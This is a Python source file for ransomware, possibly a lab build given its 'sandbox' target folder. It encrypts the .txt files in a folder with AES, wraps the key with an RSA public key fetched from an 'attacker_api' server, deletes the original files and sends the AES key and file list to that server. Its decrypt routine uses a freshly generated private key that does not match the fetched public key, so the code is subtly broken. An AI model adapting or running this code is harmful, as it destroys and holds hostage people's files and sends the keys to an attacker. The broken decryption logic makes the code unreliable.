import os
import uuid
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from keyclient import KeyClient

FILE = ".machine_id"


def get_machine_id():
    if os.path.exists(FILE):
        return open(FILE).read().strip()

    mid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
    open(FILE, "w").write(mid)
    return mid


class HybridCrypto:
    def __init__(self):
        self.client = KeyClient(
            server_url="http://attacker_api:8000",
            machine_id=get_machine_id()
        )

        self.public_key = self.client.fetch_public_key()
        self.private_key = RSA.generate(2048)

        self.aes_key = None

    def _aes_encrypt(self, data, key):
        cipher = AES.new(key, AES.MODE_EAX)
        ct, tag = cipher.encrypt_and_digest(data)
        return ct, cipher.nonce, tag

    def _aes_decrypt(self, ct, key, nonce, tag):
        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ct, tag)

    def _rsa_encrypt(self, data, pub):
        return PKCS1_OAEP.new(pub).encrypt(data)

    def _rsa_decrypt(self, data, priv):
        return PKCS1_OAEP.new(priv).decrypt(data)

    def encrypt_file(self, path):
        data = open(path, "rb").read()

        ct, nonce, tag = self._aes_encrypt(data, self.aes_key)
        enc_key = self._rsa_encrypt(self.aes_key, self.public_key)

        out_path = path + ".locked"

        with open(out_path, "wb") as f:
            for item in (enc_key, nonce, tag, ct):
                f.write(len(item).to_bytes(4, "big") + item)

        os.remove(path)
        return out_path

    def decrypt_file(self, path):
        with open(path, "rb") as f:
            kl = int.from_bytes(f.read(4), "big")
            enc_key = f.read(kl)

            nl = int.from_bytes(f.read(4), "big")
            nonce = f.read(nl)

            tl = int.from_bytes(f.read(4), "big")
            tag = f.read(tl)

            ct = f.read()

        aes_key = self._rsa_decrypt(enc_key, self.private_key)
        data = self._aes_decrypt(ct, aes_key, nonce, tag)

        out = path + ".decrypted"
        open(out, "wb").write(data)
        return out

    def encrypt_sandbox(self, folder):
        results = []

        self.aes_key = get_random_bytes(32)

        content = []

        for f in os.listdir(folder):
            if f.endswith(".txt"):
                full = os.path.join(folder, f)
                content.append(f)
                results.append(self.encrypt_file(full))

        self.client.add_aes_key(
            machine_id=self.client.machine_id,
            aes_key=self.aes_key.hex(),
            content="\n".join(content)
        )

        return results


if __name__ == "__main__":
    crypto = HybridCrypto()
    files = crypto.encrypt_sandbox("sandbox")

    print("\n".join(files))